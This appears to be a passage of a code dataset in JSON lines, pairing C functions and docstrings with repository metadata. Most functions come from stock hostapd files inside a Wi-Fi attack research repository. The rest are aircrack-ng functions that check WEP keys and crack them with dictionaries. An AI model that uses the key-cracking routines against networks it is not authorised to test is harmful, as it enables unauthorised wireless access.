&&\n\t\t\t( x1 != 0xE0 || x2 != 0xE0 ) &&\n\t\t\t( x1 != 0x42 || x2 != 0x42 ) &&\n\t\t\t( x1 != 0x02 || x2 != 0xAA ) )\t\t\t\t\t//llc sub layer management\n\t\t\tbad++;\n\n\t\tif( bad > ((tests*opt.probability)/100) )\n\t\t\treturn( FAILURE );\n\t}\n\n\topt.probability = (((tests-bad)*100)/tests);\n\tkey_found(wepkey, keylen, B);\n\n\treturn( SUCCESS );\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/*\nUses the specified dictionary to crack the WEP key.\n\nReturn: SUCCESS if it cracked the key,\n        FAILURE if it could not.\n*/\n", "func_signal": "int crack_wep_dict()", "code": "{\n\tstruct timeval t_last;\n\tstruct timeval t_now;\n\tint i, origlen, keysize;\n\tchar *key;\n\n\tkeysize = opt.keylen+1;\n\n\tupdate_ivbuf();\n\n\tif(wep.nb_ivs < TEST_MIN_IVS)\n\t{\n\t\tprintf( \"\\n%ld IVs is below the minimum required for a dictionary attack (%d IVs min.)!\\n\", wep.nb_ivs, TEST_MIN_IVS);\n\t\treturn( FAILURE );\n\t}\n\n\tkey = (char*) malloc(sizeof(char) * (opt.keylen + 1));\n\tif (key == NULL)\n\t\treturn( FAILURE );\n\n\tgettimeofday( &t_last, NULL );\n\tt_last.tv_sec--;\n\n\twhile(1)\n\t{\n\t\tif( next_key( &key, keysize ) != SUCCESS)\n\t\t{\n\t\t\tfree(key);\n\t\t\treturn( FAILURE );\n\t\t}\n\n\t\ti = strlen( key );\n\n\t\toriglen = i;\n\n\t\twhile(i<opt.keylen)\n\t\t{\n\t\t\tkey[i] = key[i - origlen];\n\t\t\ti++;\n\t\t}\n\n\t\tkey[i] = '\\0';\n\n\t\tif( ! opt.is_quiet )\n\t\t{\n\t\t\tgettimeofday( &t_now, NULL );\n\t\t\tif( (t_now.tv_sec - t_last.tv_sec) > 0)\n\t\t\t{\n\t\t\t\tshow_wep_stats(opt.keylen - 1, 1, NULL, NULL, NULL, 0);\n\t\t\t\tgettimeofday( &t_last, NULL);\n\t\t\t}\n\t\t}\n\n\t\tfor(i=0; i<=opt.keylen; i++)\n\t\t{\n\t\t\twep.key[i] = (unsigned char)key[i];\n\t\t}\n\n\t\tif(check_wep_key(wep.key, opt.keylen, 0) == SUCCESS)\n\t\t{\n\t\t\tfree(key);\n\t\t\treturn( SUCCESS );\n\t\t}\n\t}\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/**\n * Open a specific dictionary\n * nb: index of the dictionary\n * return 0 on success and FAILURE if it failed\n */\n", "func_signal": "int next_dict(int nb)", "code": "{\n\toff_t tmpword = 0;\n\n\tpthread_mutex_lock( &mx_dic );\n\tif(opt.dict != NULL)\n\t{\n\t\tif(!opt.stdin_dict) fclose(opt.dict);\n\t\topt.dict = NULL;\n\t}\n\topt.nbdict = nb;\n\tif(opt.dicts[opt.nbdict] == NULL)\n\t{\n\t\tpthread_mutex_unlock( &mx_dic );\n\t\treturn( FAILURE );\n\t}\n\n\twhile(opt.nbdict < MAX_DICTS && opt.dicts[opt.nbdict] != NULL)\n\t{\n\t\tif( strcmp( opt.dicts[opt.nbdict], \"-\" ) == 0 )\n\t\t{\n\t\t\topt.stdin_dict = 1;\n\t\t\topt.dictfinish = 1; // no ETA stats on stdin\n\n\t\t\tif( ( opt.dict = fdopen( fileno(stdin) , \"r\" ) ) == NULL )\n\t\t\t{\n\t\t\t\tperror( \"fdopen(stdin) failed\" );\n\t\t\t\topt.nbdict++;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\topt.no_stdin = 1;\n\t\t}\n\t\telse\n\t\t{\n\t\t\topt.stdin_dict = 0;\n\t\t\tif( ( opt.dict = fopen( opt.dicts[opt.nbdict], \"r\" ) ) == NULL )\n\t\t\t{\n\t\t\t\tprintf(\"ERROR: Opening dictionary %s failed (%s)\\n\", opt.dicts[opt.nbdict], strerror(errno));\n\t\t\t\topt.nbdict++;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tfseek(opt.dict, 0L, SEEK_END);\n\n\t\t\tif ( ftello( opt.dict ) <= 0L )\n\t\t\t{\n\t\t\t\tprintf(\"ERROR: Processing dictionary file %s (%s)\\n\", opt.dicts[opt.nbdict], strerror(errno));\n\t\t\t\tfclose( opt.dict );\n\t\t\t\topt.dict = NULL;\n\t\t\t\topt.nbdict++;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (!opt.dictfinish) {\n\t\t\t\tchrono(&t_dictup, 1);\n\t\t\t\topt.dictidx[opt.nbdict].dictsize\t= ftello(opt.dict);\n\n\t\t\t\tif (!opt.dictidx[opt.nbdict].dictpos || (opt.dictidx[opt.nbdict].dictpos > opt.dictidx[opt.nbdict].dictsize)) {\n\t\t\t\t\ttmpword\t\t\t\t\t= (long double)linecount(opt.dicts[opt.nbdict], (opt.dictidx[opt.nbdict].dictpos ? opt.dictidx[opt.nbdict].dictpos : 0), 32);\n\t\t\t\t\topt.dictidx[opt.nbdict].wordcount\t+= tmpword;\n\t\t\t\t\topt.wordcount\t\t\t\t+= tmpword;\n\t\t\t\t\topt.dictidx[opt.nbdict].dictpos\t\t= (READBUF_BLKSIZE*32);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\trewind( opt.dict );\n\t\t}\n\t\tbreak;\n\t}\n\n\tpthread_mutex_unlock( &mx_dic );\n\n\tif(opt.nbdict >= MAX_DICTS || opt.dicts[opt.nbdict] == NULL)\n\t    return( FAILURE );\n\n\treturn( 0 );\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/**\n * fst_group_get_peer_other_connection_2 - Find peer's \"other\" connection\n * (iface, MAC tuple) by using MB IEs of other peers.\n *\n * @iface: iface on which FST Setup Request was received\n * @peer_addr: Peer address on iface\n * @band_id: \"other\" connection band id\n * @other_peer_addr (out): Peer's MAC address on the \"other\" connection (on the\n *   \"other\" iface)\n *\n * This function iterates all connection (other_iface, cur_peer_addr tuples).\n * For each connection, MB IE (of cur_peer_addr on other_iface) is parsed and\n * MAC address on iface's band_id is extracted (this_peer_addr).\n * this_peer_addr is then compared to peer_addr. A match indicates we have\n * found the \"other\" connection.\n */\n", "func_signal": "static struct fst_iface *\nfst_group_get_peer_other_connection_2(struct fst_iface *iface,\n\t\t\t\t      const u8 *peer_addr, u8 band_id,\n\t\t\t\t      u8 *other_peer_addr)", "code": "{\n\tu8 this_band_id = fst_iface_get_band_id(iface);\n\tconst u8 *cur_peer_addr, *this_peer_addr;\n\tstruct fst_get_peer_ctx *ctx;\n\tstruct fst_iface *other_iface;\n\tconst struct wpabuf *cur_mbie;\n\n\tforeach_fst_group_iface(fst_iface_get_group(iface), other_iface) {\n\t\tif (other_iface == iface ||\n\t\t    band_id != fst_iface_get_band_id(other_iface))\n\t\t\tcontinue;\n\t\tcur_peer_addr = fst_iface_get_peer_first(other_iface, &ctx,\n\t\t\t\t\t\t\t TRUE);\n\t\tfor (; cur_peer_addr;\n\t\t     cur_peer_addr = fst_iface_get_peer_next(other_iface, &ctx,\n\t\t\t\t\t\t\t     TRUE)) {\n\t\t\tcur_mbie = fst_iface_get_peer_mb_ie(other_iface,\n\t\t\t\t\t\t\t    cur_peer_addr);\n\t\t\tif (!cur_mbie)\n\t\t\t\tcontinue;\n\t\t\tthis_peer_addr = fst_mbie_get_peer_addr_for_band(\n\t\t\t\tcur_mbie, this_band_id);\n\t\t\tif (!this_peer_addr)\n\t\t\t\tcontinue;\n\t\t\tif (os_memcmp(this_peer_addr, peer_addr, ETH_ALEN) ==\n\t\t\t    0) {\n\t\t\t\tos_memcpy(other_peer_addr, cur_peer_addr,\n\t\t\t\t\t  ETH_ALEN);\n\t\t\t\treturn other_iface;\n\t\t\t}\n\t\t}\n\t}\n\n\treturn NULL;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/fst/fst_group.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * accounting_sta_stop - Stop STA accounting\n * @hapd: hostapd BSS data\n * @sta: The station\n */\n", "func_signal": "void accounting_sta_stop(struct hostapd_data *hapd, struct sta_info *sta)", "code": "{\n\tif (sta->acct_session_started) {\n\t\taccounting_sta_report(hapd, sta, 1);\n\t\teloop_cancel_timeout(accounting_interim_update, hapd, sta);\n\t\thostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_RADIUS,\n\t\t\t       HOSTAPD_LEVEL_INFO,\n\t\t\t       \"stopped accounting session %016llX\",\n\t\t\t       (unsigned long long) sta->acct_session_id);\n\t\tsta->acct_session_started = 0;\n\t}\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/accounting.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * hostapd_select_hw_mode - Select the hardware mode\n * @iface: Pointer to interface data.\n * Returns: 0 on success, < 0 on failure\n *\n * Sets up the hardware mode, channel, rates, and passive scanning\n * based on the configuration.\n */\n", "func_signal": "int hostapd_select_hw_mode(struct hostapd_iface *iface)", "code": "{\n\tint i;\n\n\tif (iface->num_hw_features < 1)\n\t\treturn -1;\n\n\tif ((iface->conf->hw_mode == HOSTAPD_MODE_IEEE80211G ||\n\t     iface->conf->ieee80211n || iface->conf->ieee80211ac) &&\n\t    iface->conf->channel == 14) {\n\t\twpa_printf(MSG_INFO, \"Disable OFDM/HT/VHT on channel 14\");\n\t\tiface->conf->hw_mode = HOSTAPD_MODE_IEEE80211B;\n\t\tiface->conf->ieee80211n = 0;\n\t\tiface->conf->ieee80211ac = 0;\n\t}\n\n\tiface->current_mode = NULL;\n\tfor (i = 0; i < iface->num_hw_features; i++) {\n\t\tstruct hostapd_hw_modes *mode = &iface->hw_features[i];\n\t\tif (mode->mode == iface->conf->hw_mode) {\n\t\t\tiface->current_mode = mode;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (iface->current_mode == NULL) {\n\t\tif (!(iface->drv_flags & WPA_DRIVER_FLAGS_ACS_OFFLOAD) ||\n\t\t    !(iface->drv_flags & WPA_DRIVER_FLAGS_SUPPORT_HW_MODE_ANY))\n\t\t{\n\t\t\twpa_printf(MSG_ERROR,\n\t\t\t\t   \"Hardware does not support configured mode\");\n\t\t\thostapd_logger(iface->bss[0], NULL,\n\t\t\t\t       HOSTAPD_MODULE_IEEE80211,\n\t\t\t\t       HOSTAPD_LEVEL_WARNING,\n\t\t\t\t       \"Hardware does not support configured mode (%d) (hw_mode in hostapd.conf)\",\n\t\t\t\t       (int) iface->conf->hw_mode);\n\t\t\treturn -2;\n\t\t}\n\t}\n\n\tswitch (hostapd_check_chans(iface)) {\n\tcase HOSTAPD_CHAN_VALID:\n\t\treturn 0;\n\tcase HOSTAPD_CHAN_ACS: /* ACS will run and later complete */\n\t\treturn 1;\n\tcase HOSTAPD_CHAN_INVALID:\n\tdefault:\n\t\thostapd_notify_bad_chans(iface);\n\t\treturn -3;\n\t}\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/hw_features.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * accounting_init: Initialize accounting\n * @hapd: hostapd BSS data\n * Returns: 0 on success, -1 on failure\n */\n", "func_signal": "int accounting_init(struct hostapd_data *hapd)", "code": "{\n\tif (radius_gen_session_id((u8 *) &hapd->acct_session_id,\n\t\t\t\t  sizeof(hapd->acct_session_id)) < 0)\n\t\treturn -1;\n\n\tif (radius_client_register(hapd->radius, RADIUS_ACCT,\n\t\t\t\t   accounting_receive, hapd))\n\t\treturn -1;\n\tradius_client_set_interim_error_cb(hapd->radius,\n\t\t\t\t\t   accounting_interim_error_cb, hapd);\n\n\taccounting_report_state(hapd, 1);\n\n\treturn 0;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/accounting.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/* AES-CCM with fixed L=2 and aad_len <= 30 assumption */\n", "func_signal": "int aes_ccm_ae(const u8 *key, size_t key_len, const u8 *nonce,\n\t       size_t M, const u8 *plain, size_t plain_len,\n\t       const u8 *aad, size_t aad_len, u8 *crypt, u8 *auth)", "code": "{\n\tconst size_t L = 2;\n\tvoid *aes;\n\tu8 x[AES_BLOCK_SIZE], a[AES_BLOCK_SIZE];\n\n\tif (aad_len > 30 || M > AES_BLOCK_SIZE)\n\t\treturn -1;\n\n\taes = aes_encrypt_init(key, key_len);\n\tif (aes == NULL)\n\t\treturn -1;\n\n\taes_ccm_auth_start(aes, M, L, nonce, aad, aad_len, plain_len, x);\n\taes_ccm_auth(aes, plain, plain_len, x);\n\n\t/* Encryption */\n\taes_ccm_encr_start(L, nonce, a);\n\taes_ccm_encr(aes, L, plain, plain_len, crypt, a);\n\taes_ccm_encr_auth(aes, M, x, a, auth);\n\n\taes_encrypt_deinit(aes);\n\n\treturn 0;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/crypto/aes-ccm.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/* CONFIG_NO_STDOUT_DEBUG */\n", "func_signal": "int hostapd_get_hw_features(struct hostapd_iface *iface)", "code": "{\n\tstruct hostapd_data *hapd = iface->bss[0];\n\tint i, j;\n\tu16 num_modes, flags;\n\tstruct hostapd_hw_modes *modes;\n\tu8 dfs_domain;\n\n\tif (hostapd_drv_none(hapd))\n\t\treturn -1;\n\tmodes = hostapd_get_hw_feature_data(hapd, &num_modes, &flags,\n\t\t\t\t\t    &dfs_domain);\n\tif (modes == NULL) {\n\t\thostapd_logger(hapd, NULL, HOSTAPD_MODULE_IEEE80211,\n\t\t\t       HOSTAPD_LEVEL_DEBUG,\n\t\t\t       \"Fetching hardware channel/rate support not \"\n\t\t\t       \"supported.\");\n\t\treturn -1;\n\t}\n\n\tiface->hw_flags = flags;\n\tiface->dfs_domain = dfs_domain;\n\n\thostapd_free_hw_features(iface->hw_features, iface->num_hw_features);\n\tiface->hw_features = modes;\n\tiface->num_hw_features = num_modes;\n\n\tfor (i = 0; i < num_modes; i++) {\n\t\tstruct hostapd_hw_modes *feature = &modes[i];\n\t\tint dfs_enabled = hapd->iconf->ieee80211h &&\n\t\t\t(iface->drv_flags & WPA_DRIVER_FLAGS_RADAR);\n\n\t\t/* set flag for channels we can use in current regulatory\n\t\t * domain */\n\t\tfor (j = 0; j < feature->num_channels; j++) {\n\t\t\tint dfs = 0;\n\n\t\t\t/*\n\t\t\t * Disable all channels that are marked not to allow\n\t\t\t * to initiate radiation (a.k.a. passive scan and no\n\t\t\t * IBSS).\n\t\t\t * Use radar channels only if the driver supports DFS.\n\t\t\t */\n\t\t\tif ((feature->channels[j].flag &\n\t\t\t     HOSTAPD_CHAN_RADAR) && dfs_enabled) {\n\t\t\t\tdfs = 1;\n\t\t\t} else if (((feature->channels[j].flag &\n\t\t\t\t     HOSTAPD_CHAN_RADAR) &&\n\t\t\t\t    !(iface->drv_flags &\n\t\t\t\t      WPA_DRIVER_FLAGS_DFS_OFFLOAD)) ||\n\t\t\t\t   (feature->channels[j].flag &\n\t\t\t\t    HOSTAPD_CHAN_NO_IR)) {\n\t\t\t\tfeature->channels[j].flag |=\n\t\t\t\t\tHOSTAPD_CHAN_DISABLED;\n\t\t\t}\n\n\t\t\tif (feature->channels[j].flag & HOSTAPD_CHAN_DISABLED)\n\t\t\t\tcontinue;\n\n\t\t\twpa_printf(MSG_MSGDUMP, \"Allowed channel: mode=%d \"\n\t\t\t\t   \"chan=%d freq=%d MHz max_tx_power=%d dBm%s\",\n\t\t\t\t   feature->mode,\n\t\t\t\t   feature->channels[j].chan,\n\t\t\t\t   feature->channels[j].freq,\n\t\t\t\t   feature->channels[j].max_tx_power,\n\t\t\t\t   dfs ? dfs_info(&feature->channels[j]) : \"\");\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/hw_features.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * fst_group_get_peer_other_connection - Find peer's \"other\" connection (iface,\n * MAC tuple).\n *\n * @iface: iface on which FST Setup Request was received\n * @peer_addr: Peer address on iface\n * @band_id: \"other\" connection band id\n * @other_peer_addr (out): Peer's MAC address on the \"other\" connection (on the\n *   \"other\" iface)\n *\n * This function is called upon receiving FST Setup Request from some peer who\n * has peer_addr on iface. It searches for another connection of the same peer\n * on different interface which correlates with band_id. MB IEs received from\n * peer (on the two different interfaces) are used to identify same peer.\n */\n", "func_signal": "struct fst_iface *\nfst_group_get_peer_other_connection(struct fst_iface *iface,\n\t\t\t\t    const u8 *peer_addr, u8 band_id,\n\t\t\t\t    u8 *other_peer_addr)", "code": "{\n\tstruct fst_iface *other_iface;\n\n\tfst_printf(MSG_DEBUG, \"%s: %s:\" MACSTR \", %d\", __func__,\n\t\t   fst_iface_get_name(iface), MAC2STR(peer_addr), band_id);\n\n\t/*\n\t * Two search methods are used:\n\t * 1. Use peer's MB IE on iface to extract peer's MAC address on\n\t *    \"other\" connection. Then check if such \"other\" connection exists.\n\t * 2. Iterate peer database, examine each MB IE to see if it points to\n\t *    (iface, peer_addr) tuple\n\t */\n\n\tother_iface = fst_group_get_peer_other_connection_1(iface, peer_addr,\n\t\t\t\t\t\t\t    band_id,\n\t\t\t\t\t\t\t    other_peer_addr);\n\tif (other_iface) {\n\t\tfst_printf(MSG_DEBUG, \"found by method #1. %s:\" MACSTR,\n\t\t\t   fst_iface_get_name(other_iface),\n\t\t\t   MAC2STR(other_peer_addr));\n\t\treturn other_iface;\n\t}\n\n\tother_iface = fst_group_get_peer_other_connection_2(iface, peer_addr,\n\t\t\t\t\t\t\t    band_id,\n\t\t\t\t\t\t\t    other_peer_addr);\n\tif (other_iface) {\n\t\tfst_printf(MSG_DEBUG, \"found by method #2. %s:\" MACSTR,\n\t\t\t   fst_iface_get_name(other_iface),\n\t\t\t   MAC2STR(other_peer_addr));\n\t\treturn other_iface;\n\t}\n\n\tfst_printf(MSG_INFO, \"%s: other connection not found\", __func__);\n\treturn NULL;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/fst/fst_group.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * mlme_disassociate_indication - Report disassociation with a specific peer\n * MAC entity\n * @hapd: BSS data\n * @sta: Peer STA data\n * @reason_code: ReasonCode from Disassociation frame\n *\n * MLME calls this function as a result of the invalidation of an association\n * relationship with a specific peer MAC entity.\n *\n * PeerSTAAddress = sta->addr\n */\n", "func_signal": "void mlme_disassociate_indication(struct hostapd_data *hapd,\n\t\t\t\t  struct sta_info *sta, u16 reason_code)", "code": "{\n\thostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_MLME,\n\t\t       HOSTAPD_LEVEL_DEBUG,\n\t\t       \"MLME-DISASSOCIATE.indication(\" MACSTR \", %d)\",\n\t\t       MAC2STR(sta->addr), reason_code);\n\tmlme_deletekeys_request(hapd, sta);\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/ap_mlme.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/*\nop_mode\nSet to 0 (HT pure) under the followign conditions\n\t- all STAs in the BSS are 20/40 MHz HT in 20/40 MHz BSS or\n\t- all STAs in the BSS are 20 MHz HT in 20 MHz BSS\nSet to 1 (HT non-member protection) if there may be non-HT STAs\n\tin both the primary and the secondary channel\nSet to 2 if only HT STAs are associated in BSS,\n\thowever and at least one 20 MHz HT STA is associated\nSet to 3 (HT mixed mode) when one or more non-HT STAs are associated\n*/\n", "func_signal": "int hostapd_ht_operation_update(struct hostapd_iface *iface)", "code": "{\n\tu16 cur_op_mode, new_op_mode;\n\tint op_mode_changes = 0;\n\n\tif (!iface->conf->ieee80211n || iface->conf->ht_op_mode_fixed)\n\t\treturn 0;\n\n\twpa_printf(MSG_DEBUG, \"%s current operation mode=0x%X\",\n\t\t   __func__, iface->ht_op_mode);\n\n\tif (!(iface->ht_op_mode & HT_OPER_OP_MODE_NON_GF_HT_STAS_PRESENT)\n\t    && iface->num_sta_ht_no_gf) {\n\t\tiface->ht_op_mode |= HT_OPER_OP_MODE_NON_GF_HT_STAS_PRESENT;\n\t\top_mode_changes++;\n\t} else if ((iface->ht_op_mode &\n\t\t    HT_OPER_OP_MODE_NON_GF_HT_STAS_PRESENT) &&\n\t\t   iface->num_sta_ht_no_gf == 0) {\n\t\tiface->ht_op_mode &= ~HT_OPER_OP_MODE_NON_GF_HT_STAS_PRESENT;\n\t\top_mode_changes++;\n\t}\n\n\tif (!(iface->ht_op_mode & HT_OPER_OP_MODE_OBSS_NON_HT_STAS_PRESENT) &&\n\t    (iface->num_sta_no_ht || iface->olbc_ht)) {\n\t\tiface->ht_op_mode |= HT_OPER_OP_MODE_OBSS_NON_HT_STAS_PRESENT;\n\t\top_mode_changes++;\n\t} else if ((iface->ht_op_mode &\n\t\t    HT_OPER_OP_MODE_OBSS_NON_HT_STAS_PRESENT) &&\n\t\t   (iface->num_sta_no_ht == 0 && !iface->olbc_ht)) {\n\t\tiface->ht_op_mode &= ~HT_OPER_OP_MODE_OBSS_NON_HT_STAS_PRESENT;\n\t\top_mode_changes++;\n\t}\n\n\tif (iface->num_sta_no_ht)\n\t\tnew_op_mode = HT_PROT_NON_HT_MIXED;\n\telse if (iface->conf->secondary_channel && iface->num_sta_ht_20mhz)\n\t\tnew_op_mode = HT_PROT_20MHZ_PROTECTION;\n\telse if (iface->olbc_ht)\n\t\tnew_op_mode = HT_PROT_NONMEMBER_PROTECTION;\n\telse\n\t\tnew_op_mode = HT_PROT_NO_PROTECTION;\n\n\tcur_op_mode = iface->ht_op_mode & HT_OPER_OP_MODE_HT_PROT_MASK;\n\tif (cur_op_mode != new_op_mode) {\n\t\tiface->ht_op_mode &= ~HT_OPER_OP_MODE_HT_PROT_MASK;\n\t\tiface->ht_op_mode |= new_op_mode;\n\t\top_mode_changes++;\n\t}\n\n\twpa_printf(MSG_DEBUG, \"%s new operation mode=0x%X changes=%d\",\n\t\t   __func__, iface->ht_op_mode, op_mode_changes);\n\n\treturn op_mode_changes;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/ieee802_11_ht.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * sha256_prf - SHA256-based Pseudo-Random Function (IEEE 802.11r, 8.5.1.5.2)\n * @key: Key for PRF\n * @key_len: Length of the key in bytes\n * @label: A unique label for each purpose of the PRF\n * @data: Extra data to bind into the key\n * @data_len: Length of the data\n * @buf: Buffer for the generated pseudo-random key\n * @buf_len: Number of bytes of key to generate\n * Returns: 0 on success, -1 on failure\n *\n * This function is used to derive new, cryptographically separate keys from a\n * given key.\n */\n", "func_signal": "int sha256_prf(const u8 *key, size_t key_len, const char *label,\n\t\tconst u8 *data, size_t data_len, u8 *buf, size_t buf_len)", "code": "{\n\treturn sha256_prf_bits(key, key_len, label, data, data_len, buf,\n\t\t\t       buf_len * 8);\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/crypto/sha256-prf.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * sha256_prf_bits - IEEE Std 802.11-2012, 11.6.1.7.2 Key derivation function\n * @key: Key for KDF\n * @key_len: Length of the key in bytes\n * @label: A unique label for each purpose of the PRF\n * @data: Extra data to bind into the key\n * @data_len: Length of the data\n * @buf: Buffer for the generated pseudo-random key\n * @buf_len: Number of bits of key to generate\n * Returns: 0 on success, -1 on failure\n *\n * This function is used to derive new, cryptographically separate keys from a\n * given key. If the requested buf_len is not divisible by eight, the least\n * significant 1-7 bits of the last octet in the output are not part of the\n * requested output.\n */\n", "func_signal": "int sha256_prf_bits(const u8 *key, size_t key_len, const char *label,\n\t\t    const u8 *data, size_t data_len, u8 *buf,\n\t\t    size_t buf_len_bits)", "code": "{\n\tu16 counter = 1;\n\tsize_t pos, plen;\n\tu8 hash[SHA256_MAC_LEN];\n\tconst u8 *addr[4];\n\tsize_t len[4];\n\tu8 counter_le[2], length_le[2];\n\tsize_t buf_len = (buf_len_bits + 7) / 8;\n\n\taddr[0] = counter_le;\n\tlen[0] = 2;\n\taddr[1] = (u8 *) label;\n\tlen[1] = os_strlen(label);\n\taddr[2] = data;\n\tlen[2] = data_len;\n\taddr[3] = length_le;\n\tlen[3] = sizeof(length_le);\n\n\tWPA_PUT_LE16(length_le, buf_len_bits);\n\tpos = 0;\n\twhile (pos < buf_len) {\n\t\tplen = buf_len - pos;\n\t\tWPA_PUT_LE16(counter_le, counter);\n\t\tif (plen >= SHA256_MAC_LEN) {\n\t\t\tif (hmac_sha256_vector(key, key_len, 4, addr, len,\n\t\t\t\t\t       &buf[pos]) < 0)\n\t\t\t\treturn -1;\n\t\t\tpos += SHA256_MAC_LEN;\n\t\t} else {\n\t\t\tif (hmac_sha256_vector(key, key_len, 4, addr, len,\n\t\t\t\t\t       hash) < 0)\n\t\t\t\treturn -1;\n\t\t\tos_memcpy(&buf[pos], hash, plen);\n\t\t\tpos += plen;\n\t\t\tbreak;\n\t\t}\n\t\tcounter++;\n\t}\n\n\t/*\n\t * Mask out unused bits in the last octet if it does not use all the\n\t * bits.\n\t */\n\tif (buf_len_bits % 8) {\n\t\tu8 mask = 0xff << (8 - buf_len_bits % 8);\n\t\tbuf[pos - 1] &= mask;\n\t}\n\n\tos_memset(hash, 0, sizeof(hash));\n\n\treturn 0;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/crypto/sha256-prf.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * accounting_receive - Process the RADIUS frames from Accounting Server\n * @msg: RADIUS response message\n * @req: RADIUS request message\n * @shared_secret: RADIUS shared secret\n * @shared_secret_len: Length of shared_secret in octets\n * @data: Context data (struct hostapd_data *)\n * Returns: Processing status\n */\n", "func_signal": "static RadiusRxResult\naccounting_receive(struct radius_msg *msg, struct radius_msg *req,\n\t\t   const u8 *shared_secret, size_t shared_secret_len,\n\t\t   void *data)", "code": "{\n\tif (radius_msg_get_hdr(msg)->code != RADIUS_CODE_ACCOUNTING_RESPONSE) {\n\t\twpa_printf(MSG_INFO, \"Unknown RADIUS message code\");\n\t\treturn RADIUS_RX_UNKNOWN;\n\t}\n\n\tif (radius_msg_verify(msg, shared_secret, shared_secret_len, req, 0)) {\n\t\twpa_printf(MSG_INFO, \"Incoming RADIUS packet did not have correct Authenticator - dropped\");\n\t\treturn RADIUS_RX_INVALID_AUTHENTICATOR;\n\t}\n\n\treturn RADIUS_RX_PROCESSED;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/accounting.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/* NEED_AP_MLME */\n", "func_signal": "void hostapd_neighbor_set_own_report(struct hostapd_data *hapd)", "code": "{\n#ifdef NEED_AP_MLME\n\tu16 capab = hostapd_own_capab_info(hapd);\n\tint ht = hapd->iconf->ieee80211n && !hapd->conf->disable_11n;\n\tint vht = hapd->iconf->ieee80211ac && !hapd->conf->disable_11ac;\n\tstruct wpa_ssid_value ssid;\n\tu8 channel, op_class;\n\tu8 center_freq1_idx = 0, center_freq2_idx = 0;\n\tenum nr_chan_width width;\n\tu32 bssid_info;\n\tstruct wpabuf *nr;\n\n\tif (!(hapd->conf->radio_measurements[0] &\n\t      WLAN_RRM_CAPS_NEIGHBOR_REPORT))\n\t\treturn;\n\n\tbssid_info = 3; /* AP is reachable */\n\tbssid_info |= NEI_REP_BSSID_INFO_SECURITY; /* \"same as the AP\" */\n\tbssid_info |= NEI_REP_BSSID_INFO_KEY_SCOPE; /* \"same as the AP\" */\n\n\tif (capab & WLAN_CAPABILITY_SPECTRUM_MGMT)\n\t\tbssid_info |= NEI_REP_BSSID_INFO_SPECTRUM_MGMT;\n\n\tbssid_info |= NEI_REP_BSSID_INFO_RM; /* RRM is supported */\n\n\tif (hapd->conf->wmm_enabled) {\n\t\tbssid_info |= NEI_REP_BSSID_INFO_QOS;\n\n\t\tif 